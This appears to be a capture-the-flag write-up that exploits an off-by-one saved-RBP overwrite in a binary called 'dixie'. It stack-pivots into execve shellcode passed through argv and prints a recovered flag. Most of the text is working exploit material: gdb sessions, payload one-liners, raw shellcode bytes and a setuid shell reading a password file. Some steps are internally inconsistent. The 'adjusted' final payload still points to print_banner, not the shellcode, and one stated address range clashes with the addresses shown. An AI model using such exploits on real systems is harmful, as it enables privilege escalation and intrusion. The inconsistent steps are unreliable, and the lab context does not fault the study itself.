## Level 02

For level 02 we are once again handed the [source file](./source.c) and an executable, `dixie`.
The source file instantly gives us a nice hint on where to look for an exploit.
Line 64 starts a comment that mentions an off-by-one error that allows us to change the low byte of the `saved rbp`:

```c
    /* Off-by-one: the index runs 0..BUF_SIZE inclusive (<=), so a full
     * BUF_SIZE-byte read still lets the trailing pass write buf[BUF_SIZE].
     * buf is store_record's only local (counter/char are file-scope), so
     * gcc lays it out at rbp-BUF_SIZE with no padding: buf[BUF_SIZE] is the
     * low byte of the saved RBP slot.  One byte too far == one wrong move. */
    in_len = 0;
    while (in_len <= BUF_SIZE) {
        in_ch = read(0, &buf[in_len], 1);
        if (in_ch <= 0)
            break;
        in_len++;
    }
```

We can see that our `BUF_SIZE` is 64 bytes, which means our payload will be of 65 bytes total.
Since we can only adjust the lowest byte of the `saved rbp` our attack will involve more than just loading shellcode right away.
If we imagine the stack to look like this:

```
Higher Memory Addresses
+-----------------------+
|  Callee saved RIP     |
+-----------------------+
|  Callee saved RBP     |
+-----------------------+
|  Callee stack         |
+-----------------------+
|  Function args        |
+-----------------------+
|  Saved RIP            |
|  (Return Address)     |
+-----------------------+
|  Saved RBP            |
|  (Old Frame Pointer)  |
|  lower byte           |  <--- Offset at 65 bytes: changes the lower byte
+-----------------------+  <--- Offset = 64
|                       |
|   64 bytes buffer     |
|                       |
+-----------------------+  <--- Offset 0 (%rbp - 0x40) == %rsp
Lower Memory Addresses
```

We'll have to trick the executable of the location of the callee's `saved rip` aka the `return address`.
The way we'll be doing so is known as `stack pivoting`.
Adjusting the `saved rbp` allows us to modify the stack pointer after the callee function returns.
Once we have a `corrupted stack` (returned from our vulnerable function) the callee will call the `leave` and `ret` instructions on its return.

This effectively looks like:

```
Leave from our vulnerable function:
mov %rbp,%rsp
pop %rbp <--- Our corrupted stack variable is saved inside %rbp now

Ret from our vulnerable function:
pop %rip
jmp %rip

Inside callee function:

... additional code

Leave in callee:
mov %rbp(corrupted_stack),%rsp
pop %rbp

Ret in callee:
pop %rip <-- Based on our corrupted stack
jmp %rip <-- Jump to our set value

```

The executable will `pop` the `return address` based on the corrupted stack pointer, which we now have control over where it points to.
If we were to save a new `return address` inside of our array, and have the `saved rbp` point to that, the effective popped `return address` is set by us!

Lets start off with looking at the `saved rbp` that we're going to change to see what range we have access to.
In order to make sure we have the same stack addresses as running it outside of `gdb` we're going to have to `unset` some environment variables `gdb` adds:

```bash
gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "break store_record" -ex "run" dixie
...
(gdb) x/gx $rbp
0x7fffffffe100:	0x00007fffffffe120
```

We'll be able to change the `rbp` from anywhere of `0x7fffffffe100` till `0x7fffffffe1ff`.
Now we can figure out the address for the input array, lets look at the disassembly for the `store_record` function:

```asm
(gdb) disas store_record
Dump of assembler code for function store_record:
   0x00000000004013d2 <+0>:	endbr64
   0x00000000004013d6 <+4>:	push   %rbp
   0x00000000004013d7 <+5>:	mov    %rsp,%rbp
=> 0x00000000004013da <+8>:	sub    $0x40,%rsp
   0x00000000004013de <+12>:	mov    0x30fc(%rip),%eax        # 0x4044e0 <record_count>
   0x00000000004013e4 <+18>:	cmp    $0xf,%eax
   0x00000000004013e7 <+21>:	jbe    0x4013fd <store_record+43>
   0x00000000004013e9 <+23>:	lea    0xcc8(%rip),%rax        # 0x4020b8
   0x00000000004013f0 <+30>:	mov    %rax,%rdi
   0x00000000004013f3 <+33>:	call   0x401090 <puts@plt>
   0x00000000004013f8 <+38>:	jmp    0x4014a1 <store_record+207>
   0x00000000004013fd <+43>:	lea    0xcd3(%rip),%rax        # 0x4020d7
   0x0000000000401404 <+50>:	mov    %rax,%rdi
   0x0000000000401407 <+53>:	mov    $0x0,%eax
   0x000000000040140c <+58>:	call   0x4010a0 <printf@plt>
   0x0000000000401411 <+63>:	mov    0x2c28(%rip),%rax        # 0x404040 <stdout@GLIBC_2.2.5>
   0x0000000000401418 <+70>:	mov    %rax,%rdi
   0x000000000040141b <+73>:	call   0x4010e0 <fflush@plt>
   0x0000000000401420 <+78>:	movq   $0x0,0x30bd(%rip)        # 0x4044e8 <in_len>
   0x000000000040142b <+89>:	jmp    0x40146f <store_record+157>
   0x000000000040142d <+91>:	mov    0x30b4(%rip),%rax        # 0x4044e8 <in_len>
   0x0000000000401434 <+98>:	lea    -0x40(%rbp),%rdx
   0x0000000000401438 <+102>:	add    %rdx,%rax
   0x000000000040143b <+105>:	mov    $0x1,%edx
   0x0000000000401440 <+110>:	mov    %rax,%rsi
   0x0000000000401443 <+113>:	mov    $0x0,%edi
   0x0000000000401448 <+118>:	call   0x4010c0 <read@plt>

	...
```

We can see the array being passed to the `read` function:

```asm
   0x0000000000401434 <+98>:	lea    -0x40(%rbp),%rdx
```

We also know that `-0x40(%rbp)` should be equal to the `sub    $0x40,%rsp` that happens at the start of the function.
So to figure out what the address of our array is we can set a breakpoint after the `sub    $0x40,%rsp` and inspect the `rsp` register.
Again making sure we do not run `gdb` with a modified environment:

```bash
gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "break *0x00000000004013de" -ex "run" dixie
...
Breakpoint 1, 0x00000000004013de in store_record ()
(gdb) i r rsp
rsp            0x7fffffffe0a0      0x7fffffffe0a0
```

Notice how our array is not in the `0x...e100 - 0x...e1ff` range, we'll need to make some adjustments to the stack.
We can manipulate the stack addresses by either adding `argv` arguments, or changing the environment variables.

We can first try running our program without any environment variables set using `env -i`:

```bash
env -i gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "break store_record" -ex "run" dixie
```

Lets take a look at what the `saved rbp` and `array` address look like now:

```bash
Breakpoint 1, 0x00000000004013da in store_record ()
(gdb) x/gx $rbp
0x7fffffffecc0:	0x00007fffffffece0
(gdb) si
0x00000000004013de in store_record ()
(gdb) i r rsp
rsp            0x7fffffffec80      0x7fffffffec80
```

Great! Both the `saved rbp` and `array` live in the `0x..ec00 - 0x...ecff` range!
We can now do a quick check to see if our approach can work.
Let's try to jump to the `print_banner` function by setting the address of it inside our `corrupted stack`.
To know where `print_banner` is located we can simply disassemble it:

```bash
gdb -nx dixie
...
(gdb) disas print_banner
Dump of assembler code for function print_banner:
   0x0000000000401276 <+0>:	endbr64
   0x000000000040127a <+4>:	push   %rbp
   0x000000000040127b <+5>:	mov    %rsp,%rbp
```

Now that we know the address of our array `0x7fffffffec80` and the address for the `print_banner` function `0x0000000000401276` we can craft a simple payload:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'\x76\x12\x40\x00\x00\x00\x00\x00' + b'\x00' * 56 + b'\x78')" > payload
```

What we've done here is set the address of `print_banner` at the start of our input, added some extra padding bytes to fill the rest of the array and finish it by setting the `saved rbp` to `0x7fffffffec78`. We offset the `saved rbp` by 8 bytes from our array start, since the main will have to do one `pop` of its own `saved rbp` before attempting to `pop` it's `saved return address`.

Lets see if this works, calling `dixie` with only the `PWD` environment variable set (since GDB will always set this on run 😠):

```bash
level02@rainfall:~$ cat payload - | env -i PWD=$PWD $PWD/dixie
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
[FLATLINE] Ready: [FLATLINE] Record 0 stored. Checksum: 5a5a5b08
[FLATLINE] Record 0: v@ (checksum: 5a5a5b08)
  [FLATLINE]���� session closed.
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
```

It works! The `print_banner` function got called twice!

Now this leaves us with the final challenge, we only have `56 bytes` for our shellcode, since we need to store the `return address` in the same input array.
In [`level00`](../../level00/resources/walkthrough.md) we wrote some shellcode that ended up being a total of `71 bytes`, we'll either need to find a way to shrink this down significantly or find another place to inject our shellcode.

One way would be to utilize the `argv`, this gives us virtually unlimited space to inject it and since `ASLR` is turned off we also know where its located. The only thing we'll have to take into account is that the location of our `input array` remains within the range of the `saved rbp` of the vulnerable function.

First thing we'd have to figure out is what the address of `argv` is.
Creating the binary first:

```bash
level02@rainfall:~$ python3 -c "import sys; sys.stdout.buffer.write(b'\x48\x83\xc4\x28\x48\xb8\x11\x11\x11\x11\x11\x11\x11\x11\x49\xbc\x3e\x73\x78\x7f\x3e\x62\x79\x11\x49\xbd\x3c\x61\x11\x11\x11\x11\x11\x11\x49\x31\xc4\x41\x54\x49\x89\xe4\x49\x31\xc5\x41\x55\x49\x89\xe5\x4c\x89\xe7\x48\x31\xc0\x50\x41\x55\x41\x54\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05')" > shellcode
```

We can use `cat` to put it on `argv`, doing this will mess with all the the stack addresses again, so once again we'll first need to check what the address of our `input array` is and if the `input array` remains within the `saved rbp` range:

```bash
env -i gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "break main" -ex 'run < payload $(cat shellcode)' ./dixie
...
(gdb) print *(char**)$rsi
$1 = 0x7fffffffef76 "/home/level02/dixie"
(gdb) print *((char**)$rsi + 1)
$2 = 0x7fffffffef8a "H\203\304(H\270\021\021\021\021\021\021\021\021I\274>sx\177>by\021I\275<a\021\021\021\021\021\021I1\304ATI\211\344I1\305AUI\211\345L\211\347H1\300PAUATH\211\346H1\322\260;\017\005"
...
b *0x00000000004013de
Breakpoint 2 at 0x4013de
...
(gdb) i r rsp
rsp            0x7fffffffec30      0x7fffffffec30
(gdb) x/gx $rbp
0x7fffffffec70:	0x00007fffffffec90
```

We confirmed that our shellcode gets inserted in the `argv` at address `0x7fffffffef8a`, that the `input array` is now shifted to address `0x7fffffffec30` and that it falls within the `0x...fe00 - 0x...feff` range of the `saved rbp`.
Adjusting our payload to this new address (0x28 to take the extra 8 bytes of the main's `pop rbp` into account):

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'\x76\x12\x40\x00\x00\x00\x00\x00' + b'\x00' * 56 + b'\x28')" > payload
```


Putting it all together, we can run the `dixie` executable with only `PWD` in its environment (since `gdb` always adds this), handing it the `payload` on its standard input through the `cat payload -` (the extra `-` to make sure the shell does not close) and finally setting the `shellcode` on its `argv` we can beat the level:


```bash
cat payload - | env -i PWD=$PWD $PWD/dixie "$(cat shellcode)"
...
id
uid=1003(level02) gid=1005(level02) euid=1019(flag02) groups=1005(level02),1001(levelgroup)
cat /home/flag02/.pass
qeplvibynup98phqb312dkvhtpdkklac
```

We end up with our flag: `qeplvibynup98phqb312dkvhtpdkklac`
